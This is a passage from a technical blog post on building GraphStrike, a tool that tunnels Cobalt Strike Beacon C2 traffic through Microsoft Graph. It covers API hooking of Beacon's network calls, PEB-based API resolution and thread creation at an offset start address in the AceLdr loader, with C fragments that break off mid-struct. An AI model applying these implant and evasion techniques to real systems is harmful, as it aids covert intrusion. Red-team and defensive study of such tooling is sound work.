<p data-renderer-start-pos="22915">Return address spoofing, while cool and very valuable in its own right when it comes to evasion, isn’t really relevant to the task at hand. What is <strong data-renderer-mark="true">very</strong> relevant is the ability to intercept an API call, run some user-defined code, and then patch execution back to the real API called by the process. This grants us the ability to intercept and change parameters that were sent by Beacon before we call the real API, and opens the door to:</p>
<ol class="ak-ol" start="1" data-indent-level="1">
<li>
<p data-renderer-start-pos="23357">Making web requests outside of Beacon’s normal communication cycle in order to fetch new access tokens</p>
</li>
<li>
<p data-renderer-start-pos="23463">Storing and rotating access tokens in memory</p>
</li>
<li>
<p data-renderer-start-pos="23511">Modifying the headers provided by Beacon for a request to include the current access token</p>
</li>
<li>
<p data-renderer-start-pos="23605">Changing the verb used by Beacon to PUT so that it might support using the Graph API file methods</p>
</li>
</ol>
<p data-renderer-start-pos="23706">Critically, AceLdr provides a working framework from which I can customize in order to satisfy the requirements identified for GraphStrike.</p>
<p>&nbsp;</p>
<h4 id="Some-notes-on-AceLdr-and-UDRLs." data-renderer-start-pos="23847"><span class="ez-toc-section" id="Some_notes_on_AceLdr_and_UDRLs" ez-toc-data-id="#Some_notes_on_AceLdr_and_UDRLs"></span>Some notes on AceLdr and <span id="d7f92a1a-a80d-4dce-a7c9-71cb26128f94" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="d7f92a1a-a80d-4dce-a7c9-71cb26128f94">UDRLs</span>.<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="23880">The discovery of AceLdr pushes this idea past the identified blockers into the realm of viability. We have identified a way to run arbitrary code both before Beacon executes (via the UDRL) as well as throughout Beacon’s lifecycle (via hooked functions that are set up by the UDRL), but before we dive into the specifics of how to leverage those abilities for GraphStrike we should take a closer look at some relevant parts of AceLdr and how they affect this project. The Cobalt Strike team released a <a class="cc-tgpl01" title="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development" href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development" data-testid="link-with-safety" data-renderer-mark="true">great blog</a> that covers some of the fundamental theory and design behind UDRL’s that I would highly encourage readers to check out.</p>
<p data-renderer-start-pos="24513">One of the fun extra burdens that comes with UDRL development is that the code must be written to be position independent; this places limitations on the normal use of the Windows and C API as well as the use of global variables and standard strings. AceLdr uses a neat trick with a few macros to enable normal string use, but we still must manually create functions pointers for any API’s we want to use in our code. AceLdr does this with a function called ‘resolveAceFunctions’, which looks like this:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> B </span><span class="enlighter-g1">)</span><span class="enlighter-text"> NTSTATUS </span><span class="enlighter-m0">resolveAceFunctions</span><span class="enlighter-g1">(</span><span class="enlighter-text"> PAPI pApi </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PPEB    Peb;</span></div></div><div class=""><div><span class="enlighter-text">    HANDLE  hNtdll;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    Peb = </span><span class="enlighter-m0">NtCurrentTeb</span><span class="enlighter-g1">()</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ProcessEnvironmentBlock;</span></div></div><div class=""><div><span class="enlighter-text">    hNtdll = </span><span class="enlighter-m0">FindModule</span><span class="enlighter-g1">(</span><span class="enlighter-text"> H_LIB_NTDLL, Peb, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text"> !hNtdll </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> -1;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">NtGetContextThread</span><span class="enlighter-text">  = </span><span class="enlighter-m0">FindFunction</span><span class="enlighter-g1">(</span><span class="enlighter-text"> hNtdll, H_API_NTGETCONTEXTTHREAD </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">NtSetContextThread</span><span class="enlighter-text">  = </span><span class="enlighter-m0">FindFunction</span><span class="enlighter-g1">(</span><span class="enlighter-text"> hNtdll, H_API_NTSETCONTEXTTHREAD </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">NtResumeThread</span><span class="enlighter-text">      = </span><span class="enlighter-m0">FindFunction</span><span class="enlighter-g1">(</span><span class="enlighter-text"> hNtdll, H_API_NTRESUMETHREAD </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">RtlUserThreadStart</span><span class="enlighter-text">  = </span><span class="enlighter-m0">FindFunction</span><span class="enlighter-g1">(</span><span class="enlighter-text"> hNtdll, H_API_RTLUSERTHREADSTART </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">RtlCreateUserThread</span><span class="enlighter-text"> = </span><span class="enlighter-m0">FindFunction</span><span class="enlighter-g1">(</span><span class="enlighter-text"> hNtdll, H_API_RTLCREATEUSERTHREAD </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text"> !pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">NtGetContextThread</span><span class="enlighter-text"> ||</span></div></div><div class=""><div><span class="enlighter-text">        !pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">NtSetContextThread</span><span class="enlighter-text"> ||</span></div></div><div class=""><div><span class="enlighter-text">        !pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">NtResumeThread</span><span class="enlighter-text">     ||</span></div></div><div class=""><div><span class="enlighter-text">        !pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">RtlUserThreadStart</span><span class="enlighter-text"> ||</span></div></div><div class=""><div><span class="enlighter-text">        !pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">RtlCreateUserThread</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> -1;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> STATUS_SUCCESS;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( B ) NTSTATUS resolveAceFunctions( PAPI pApi )
{
    PPEB    Peb;
    HANDLE  hNtdll;

    Peb = NtCurrentTeb()-&gt;ProcessEnvironmentBlock;
    hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );
    
    if( !hNtdll )
    {
        return -1;
    };

    pApi-&gt;ntdll.NtGetContextThread  = FindFunction( hNtdll, H_API_NTGETCONTEXTTHREAD );
    pApi-&gt;ntdll.NtSetContextThread  = FindFunction( hNtdll, H_API_NTSETCONTEXTTHREAD );
    pApi-&gt;ntdll.NtResumeThread      = FindFunction( hNtdll, H_API_NTRESUMETHREAD );
    pApi-&gt;ntdll.RtlUserThreadStart  = FindFunction( hNtdll, H_API_RTLUSERTHREADSTART );
    pApi-&gt;ntdll.RtlCreateUserThread = FindFunction( hNtdll, H_API_RTLCREATEUSERTHREAD );

    if( !pApi-&gt;ntdll.NtGetContextThread ||
        !pApi-&gt;ntdll.NtSetContextThread ||
        !pApi-&gt;ntdll.NtResumeThread     ||
        !pApi-&gt;ntdll.RtlUserThreadStart ||
        !pApi-&gt;ntdll.RtlCreateUserThread )
    {
        return -1;
    };

    return STATUS_SUCCESS;
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( B ) NTSTATUS resolveAceFunctions( PAPI pApi )
{
&nbsp;&nbsp;&nbsp;&nbsp;PPEB&nbsp;&nbsp;&nbsp;&nbsp;Peb;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;&nbsp;hNtdll;

&nbsp;&nbsp;&nbsp;&nbsp;Peb&nbsp;=&nbsp;NtCurrentTeb()-&gt;ProcessEnvironmentBlock;
&nbsp;&nbsp;&nbsp;&nbsp;hNtdll&nbsp;=&nbsp;FindModule(&nbsp;H_LIB_NTDLL,&nbsp;Peb,&nbsp;NULL&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if(&nbsp;!hNtdll&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
&nbsp;&nbsp;&nbsp;&nbsp;};

&nbsp;&nbsp;&nbsp;&nbsp;pApi-&gt;ntdll.NtGetContextThread&nbsp;&nbsp;=&nbsp;FindFunction(&nbsp;hNtdll,&nbsp;H_API_NTGETCONTEXTTHREAD&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;pApi-&gt;ntdll.NtSetContextThread&nbsp;&nbsp;=&nbsp;FindFunction(&nbsp;hNtdll,&nbsp;H_API_NTSETCONTEXTTHREAD&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;pApi-&gt;ntdll.NtResumeThread&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;FindFunction(&nbsp;hNtdll,&nbsp;H_API_NTRESUMETHREAD&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;pApi-&gt;ntdll.RtlUserThreadStart&nbsp;&nbsp;=&nbsp;FindFunction(&nbsp;hNtdll,&nbsp;H_API_RTLUSERTHREADSTART&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;pApi-&gt;ntdll.RtlCreateUserThread&nbsp;=&nbsp;FindFunction(&nbsp;hNtdll,&nbsp;H_API_RTLCREATEUSERTHREAD&nbsp;);

&nbsp;&nbsp;&nbsp;&nbsp;if(&nbsp;!pApi-&gt;ntdll.NtGetContextThread&nbsp;||
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!pApi-&gt;ntdll.NtSetContextThread&nbsp;||
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!pApi-&gt;ntdll.NtResumeThread&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!pApi-&gt;ntdll.RtlUserThreadStart&nbsp;||
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!pApi-&gt;ntdll.RtlCreateUserThread&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
&nbsp;&nbsp;&nbsp;&nbsp;};

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;STATUS_SUCCESS;
};</pre>
<p>Here AceLdr uses some helper functions like ‘FindModule’ and ‘FindFunction’ in order to resolve the memory addresses for several different API’s within NTDLL. These addresses are combined with type definitions within the PAPI struct (which was passed into resolveAceFunctions as a parameter) in order to create function pointers which may be used later. This can be seen in the ‘createBeaconThread’ function, which uses the ‘RtlCreateUserThread’ function pointer:</p>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> B </span><span class="enlighter-g1">)</span><span class="enlighter-text"> NTSTATUS </span><span class="enlighter-m0">createBeaconThread</span><span class="enlighter-g1">(</span><span class="enlighter-text"> PAPI pApi, PHANDLE thread </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    BOOL Suspended = </span><span class="enlighter-e0">TRUE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID StartAddress = </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">RtlUserThreadStart</span><span class="enlighter-text"> + </span><span class="enlighter-n2">0x21</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> pApi-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ntdll.</span><span class="enlighter-m3">RtlCreateUserThread</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> HANDLE </span><span class="enlighter-g1">)</span><span class="enlighter-text">-1, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, Suspended, 0, 0, 0, </span><span class="enlighter-g1">(</span><span class="enlighter-text"> PUSER_THREAD_START_ROUTINE </span><span class="enlighter-g1">)</span><span class="enlighter-text">StartAddress, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, thread, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
{
    BOOL Suspended = TRUE;
    PVOID StartAddress = C_PTR( pApi-&gt;ntdll.RtlUserThreadStart + 0x21 );

    return pApi-&gt;ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
{
&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Suspended&nbsp;=&nbsp;TRUE;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;StartAddress&nbsp;=&nbsp;C_PTR(&nbsp;pApi-&gt;ntdll.RtlUserThreadStart&nbsp;+&nbsp;0x21&nbsp;);

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;pApi-&gt;ntdll.RtlCreateUserThread(&nbsp;(&nbsp;HANDLE&nbsp;)-1,&nbsp;NULL,&nbsp;Suspended,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;(&nbsp;PUSER_THREAD_START_ROUTINE&nbsp;)StartAddress,&nbsp;NULL,&nbsp;thread,&nbsp;NULL&nbsp;);
};</pre>
<p>This methodology for resolving API’s is used in each of AceLdr’s custom functions (like InternetConnectA_Hook shown earlier).</p>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
<h2 id="Technical-Design" data-renderer-start-pos="26907"><span class="ez-toc-section" id="Technical_Design" ez-toc-data-id="#Technical_Design"></span>Technical Design<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="26925">With some basics concerning AceLdr and UDRL’s covered, it’s time to figure out how to make this work in GraphStrike. Note that for the remainder of this article the UDRL portion of GraphStrike will be referred to as GraphLdr; AceLdr is still the underlying heart and soul, but it will undergo significant enough transformation to warrant its own distinguishing name.</p>
<p data-renderer-start-pos="27293">Several subsections related to the technical design details of GraphStrike are broken out below. I tried to go in some kind of “order”, but understand that a lot of these pieces are inherently tied together and influenced by each other so it’s difficult to write in a true linear fashion. Also note that any code snippets included represent the “working” code found in the final product; that is to say, the early versions of this project were far less refined or efficient than what you see here.</p>
<p>&nbsp;</p>
<h4 id="Replacing-Global-Variables" data-renderer-start-pos="27793"><span class="ez-toc-section" id="Replacing_Global_Variables" ez-toc-data-id="#Replacing_Global_Variables"></span>Replacing Global Variables<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="27821">Before digging too far into the technical weeds there is some groundwork that needs to be done. There are a number of values that must be tracked throughout Beacon’s lifetime in order to control the behavior of GraphStrike’s components. These variables are used by various functions within different source files, so a global variable is really the right tool for the job. It was only briefly mentioned but writing position independent code imposes limitations in this regard. This has to do with the specific section within <span id="a3dea769-1741-420a-a66a-32854e57df92" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="a3dea769-1741-420a-a66a-32854e57df92">a Windows </span>Portable Executable (PE) that global variables are stored in, which is not included in the final GraphLdr UDRL.</p>
<p data-renderer-start-pos="28469">Another issue that was alluded to is that any function within GraphLdr that wants to use Windows or C APIs must manually resolve them first. This includes the custom API hook functions. Something to consider is how often these functions are called; for example, Beacon calls InternetConnectA_Hook each time it makes a new http-get or http-post request, so if a Beacon’s sleep time is set to one second, the hooked function is called at least 60 times per minute. Each and every time, InternetConnectA_Hook must call the helper functions mentioned earlier in order to resolve the API’s it needs, which seems horribly inefficient.</p>
<p data-renderer-start-pos="29099">The solution to both of these problems lies in a technique that has made its way into a couple of my tools at this point: creating a custom struct on the heap that contains the required variables, and then storing the memory address of that struct for later retrieval and use by various functions. Within this struct we can store function pointers for every Windows or C API that we will use throughout the entirety of GraphLdr, as well as the additional individual variables use to control GraphStrike’s behavior. This struct is shown below:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k2">struct</span><span class="enlighter-text"> MemAddrs </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k2">struct</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> RtlAllocateHeap </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> NtWaitForSingleObject </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            HANDLE hNtdll;</span></div></div><div class=""><div><span class="enlighter-text">            ULONG size;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"> ntdll;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k2">struct</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> InternetConnectA </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> HttpOpenRequestA </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> HttpSendRequestA </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> InternetReadFile </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> InternetCloseHandle </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            HANDLE hNet;</span></div></div><div class=""><div><span class="enlighter-text">            ULONG size;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"> net;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k2">struct</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> GetLastError </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> SetLastError </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> QueryPerformanceCounter </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> QueryPerformanceFrequency </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> Sleep </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"> k32;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k2">struct</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> strlen </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> strstr </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> strcpy </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> strcmp </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> isdigit </span><span class="enlighter-g1">)</span><span class="enlighter-text">;            </span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> sprintf </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> memset </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> malloc </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> calloc </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> memcpy </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> free </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> tolower </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"> msvcrt;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k2">struct</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">D_API</span><span class="enlighter-g1">(</span><span class="enlighter-text"> MessageBoxA </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"> user32;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"> Api, *pApi;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    BOOL            graphStrike;</span></div></div><div class=""><div><span class="enlighter-text">    HINTERNET       hInternet;</span></div></div><div class=""><div><span class="enlighter-text">    BOOL            firstGet;</span></div></div><div class=""><div><span class="enlighter-text">    BOOL            firstPost;</span></div></div><div class=""><div><span class="enlighter-text">    BOOL            